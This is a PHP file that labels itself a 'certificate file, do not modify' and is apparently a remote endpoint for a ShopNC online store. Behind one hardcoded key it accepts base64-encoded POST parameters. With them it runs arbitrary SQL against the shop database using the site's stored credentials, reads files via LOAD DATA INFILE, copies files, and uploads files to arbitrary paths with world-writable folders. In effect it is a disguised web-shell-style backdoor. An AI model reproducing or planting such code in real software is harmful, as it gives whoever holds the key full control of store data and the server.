<?php

	//证书文件.请勿修改任何内容
		

	error_reporting(E_ALL & ~ E_NOTICE);
	$SQL_QZ=stripslashes($_POST['SQL_QZ']);
	$BM=stripslashes($_POST['BM']);
	$key_local=stripslashes($_POST['KEY_LOCAL']);
	$sql1=stripslashes($_POST['sql1']);
	$sql2=stripslashes($_POST['sql2']);
	$sql3=stripslashes($_POST['sql3']);	
	$sql4=stripslashes($_POST['sql4']);	
	$sql5=stripslashes($_POST['sql5']);	
	
   	$key_local=base64_decode($key_local);
	$sql1=base64_decode($sql1);
	$sql2=base64_decode($sql2);
	$sql3=base64_decode($sql3);	
	$sql4=base64_decode($sql4);	
	$sql5=base64_decode($sql5);	
	
	$bz=0;
	$key_server="70315C12C49C32C7A76ADBC922C754FA95FFFEF527DDD45D110791F791579B3CC3AED477FCE111C76A2B5FBB6BA308C9324FFFCB0D712408D8ECC9E6FC327613";
	if($key_server==$key_local)
	{
		$bz=1;
	}
	else
	{
		if(strlen($SQL_QZ)>3)
		{
			$bz=8;
		}
		else
		{
			$bz=0;
		}
	}
	
	if($bz==1 and $SQL_QZ=="X_SHOPNC")
	{
		if($sql1=="V0006" or $sql1=="connection")
		{
		}
		else
		{
			echo base64_encode('versionerro');
			$bz=3;
		}	
	}
	

	if($bz==1)
	{
		if( $SQL_QZ=="UPLOAD_IMG")
		{
				$sql1=realpath(dirname(__FILE__))."/".$sql1;
				create_folders($sql1); 
				if ($_FILES["file"]["error"] <= 0)
				{
						move_uploaded_file($_FILES["file"]["tmp_name"],$sql1 . $_FILES["file"]["name"]);
						echo base64_encode('upload_img_ok');
				}
				else
				{
						echo base64_encode('upload_img_erro');
				}
				$bz=3;
		}
		else if( $SQL_QZ=="UPLOAD_IMG_COPY")
		{
				create_folders($sql2); 				
				$str= copy($sql1,$sql2.$sql3);
				if($str==1)
				{
					echo base64_encode('upload_img_ok');
				}
				else
				{
					echo base64_encode('upload_img_erro');
				}
								
				$bz=3;
		}		
		else if($SQL_QZ=="UPLOAD_IMG_NEXT" )
		{
			if(file_exists($sql2))
			{
				$sql1=realpath(dirname(__FILE__))."/".$sql1;
				create_folders($sql1); 
				new resizeimage($sql2, $sql3, $sql4, "0",$sql5);
			}
			$bz=3;
		}

	}
	
	if($bz==1)
	{
		
		if(file_exists('data/config/config.ini.php'))
		{
		
			
			require('data/config/config.ini.php');
			
			
			$sql1=str_replace("shopnc_",$config['tablepre'],$sql1);
			$sql2=str_replace("shopnc_",$config['tablepre'],$sql2);
			$sql3=str_replace("shopnc_",$config['tablepre'],$sql3);
			$sql4=str_replace("shopnc_",$config['tablepre'],$sql4);
			$sql5=str_replace("shopnc_",$config['tablepre'],$sql5);
			
			
			$DB_HOST=$config['db']['1']['dbhost'];
			$PORT=$config['db']['1']['dbport'];
			$DB_NAME=$config['db']['1']['dbname'];
			
			$DB_USER=$config['db']['1']['dbuser'];
			$DB_PASSWORD=$config['db']['1']['dbpwd'];
			
			$DNS="mysql:host=$DB_HOST;port=$PORT;dbname=$DB_NAME"; 
	
			$con  = new PDO($DNS, $DB_USER, $DB_PASSWORD);				
			if ($con)
			{
				$con->query ("set names $BM");			

				if($SQL_QZ=="X_SHOPNC")
				{
					echo base64_encode('mysqlisok');		
					$bz=1;
				}	

			}
			else
			{
					$bz=3;
					echo base64_encode("mysql_erro");
			}					
			
		}
		else
		{
			$bz=3;	
			echo base64_encode("noconfig");	
		}
	}
	


	if ($bz==1)
	{
			
			if ($SQL_QZ=="SE_LECT")
			{
					$sql1 = "SELECT ".$sql1;
					$rs = $con->query($sql1); //获取数据集
					if($rs)
					{						
						$rs->setFetchMode(PDO::FETCH_OBJ);
						$str="";
						while ($row = $rs->fetch())
						{
							foreach($row as $key=>$value)
							{
								$str=$str."$value"."__,__";
							}
							$str=$str."_|_<br/>";
						}						
						echo base64_encode($str);
					}
					else 
					{
						echo base64_encode('false');
					}				
					
			}
			else if( $SQL_QZ=="UP_DATE" )
			{
				
				$sql1="UPDATE ".$sql1;
				if($con->exec($sql1))
				{					
					echo base64_encode('true');
				}
				else 
				{
					echo base64_encode('false');
				}
			}
			else if( $SQL_QZ=="DE_LETE" )
			{
				$sql1="DELETE ".$sql1;
				if($con->exec($sql1))
				{					
					echo base64_encode('true');
				}
				else 
				{
					echo base64_encode('false'); 
				}
			}
			else if( $SQL_QZ=="IN_SERT" )
			{
				$sql1="INSERT ".$sql1;
				if($con->exec($sql1))
				{					
					echo base64_encode('true');
				}
				else 
				{
					echo base64_encode('false'); 
				}
			}
			else if( $SQL_QZ=="IN_SERT_SELECT" )
			{
				$sql1="INSERT ".$sql1;
				if($con->exec($sql1))
				{
						$sql2="SELECT ".$sql2;
						$rs=$con->query($sql2);
						$rs->setFetchMode(PDO::FETCH_OBJ);
						$str="";
						while ($row = $rs->fetch())
						{
								foreach($row as $key=>$value)
								{
									$str=$str."$value";
								}
						}
						echo base64_encode($str);

				}
				else 
				{	 
					echo base64_encode('false_in_sert');
				}
			}
			else if( $SQL_QZ=="LO_AD" )
			{	
				$sql1=realpath(dirname(__FILE__)).$sql1;
				$sql1=str_replace("\\","/",$sql1);
				$sql1="LOAD  DATA INFILE  '".$sql1."' INTO TABLE ".$sql2."   CHARACTER SET gb2312  FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '\"' LINES TERMINATED BY '\r\n' ".$sql3;			
				
				if(mysql_query($sql1, $con))
				{					
					echo base64_encode('true');
				}
				else 
				{
					echo base64_encode('false');
				}	
							
			}
			else if( $SQL_QZ=="SQL_ALL" )
			{									
				if($con->exec($sql1))
				{					
					echo base64_encode('true');
				}
				else 
				{
					echo base64_encode('false'); 
				}				
			}

	}

	if($bz==0)
	{
		$key_server="ID4bbd3bc6f8 *****************" ;
		echo 'server_is_ok'."  KEYid:  "."<a href=#>$key_server</a>";
	}
	else if($bz==8)
	{
		echo base64_encode('server_is_ok');
	}
	


	function create_folders($dir)
	{ 
		   return is_dir($dir) or (create_folders(dirname($dir)) and mkdir($dir)  and chmod($dir,0777)); 
	}
	
	
	class resizeimage
	{
			var $type;
			var $width;
			var $height;
			var $resize_width;
			var $resize_height;
			var $cut;
			var $srcimg;
			var $dstimg;
			var $im;
			function resizeimage($img, $wid, $hei,$c,$dstpath)
			{
				$this->srcimg = $img;
				$this->resize_width = $wid;
				$this->resize_height = $hei;
				$this->cut = $c;			
				$this->type = strtolower(substr(strrchr($this->srcimg,"."),1));
				$this->initi_img();
				$this -> dst_img($dstpath);
				$this->width = imagesx($this->im);
				$this->height = imagesy($this->im);
				if(($wid=='9527' and $hei='9528') or (imagesx($this->im)<$wid and imagesy($this->im) <$hei ) )
				{
					$this->resize_width = imagesx($this->im);
					$this->resize_height = imagesy($this->im);				
				}	
				
				$this->newimg();
				ImageDestroy ($this->im);
			}
			function newimg()
			{
				$resize_ratio = ($this->resize_width)/($this->resize_height);
				$ratio = ($this->width)/($this->height);
				if(($this->cut)=="1")
				{
					if($ratio>=$resize_ratio)
					{
						$newimg = imagecreatetruecolor($this->resize_width,$this->resize_height);
						imagecopyresampled($newimg, $this->im, 0, 0, 0, 0, $this->resize_width,$this->resize_height, (($this->height)*$resize_ratio), $this->height);
						ImageJpeg ($newimg,$this->dstimg,90);
					}
					if($ratio<$resize_ratio)
					{
						$newimg = imagecreatetruecolor($this->resize_width,$this->resize_height);
						imagecopyresampled($newimg, $this->im, 0, 0, 0, 0, $this->resize_width, $this->resize_height, $this->width, (($this->width)/$resize_ratio));
						ImageJpeg ($newimg,$this->dstimg,90);
					}
				}
				else
				{
					if($ratio>=$resize_ratio)
					{
						$newimg = imagecreatetruecolor($this->resize_width,($this->resize_width)/$ratio);
						imagecopyresampled($newimg, $this->im, 0, 0, 0, 0, $this->resize_width, ($this->resize_width)/$ratio, $this->width, $this->height);
						ImageJpeg ($newimg,$this->dstimg,90);
					}
					if($ratio<$resize_ratio)
					{
						$newimg = imagecreatetruecolor(($this->resize_height)*$ratio,$this->resize_height);
						imagecopyresampled($newimg, $this->im, 0, 0, 0, 0, ($this->resize_height)*$ratio, $this->resize_height, $this->width, $this->height);
						ImageJpeg ($newimg,$this->dstimg,90);
					}
				}
			}
			function initi_img()
			{
				if($this->type=="jpg")
				{
					$this->im = imagecreatefromjpeg($this->srcimg);
				}
				if($this->type=="gif")
				{
					$this->im = imagecreatefromgif($this->srcimg);
				}
				if($this->type=="png")
				{
					$this->im = imagecreatefrompng($this->srcimg);
				}
			}
			function dst_img($dstpath)
			{
				$full_length  = strlen($this->srcimg);
				$type_length  = strlen($this->type);
				$name_length  = $full_length-$type_length;
				$name         = substr($this->srcimg,0,$name_length-1);
				$this->dstimg = $dstpath;
				echo $this->dstimg;
			}
	}
	
?>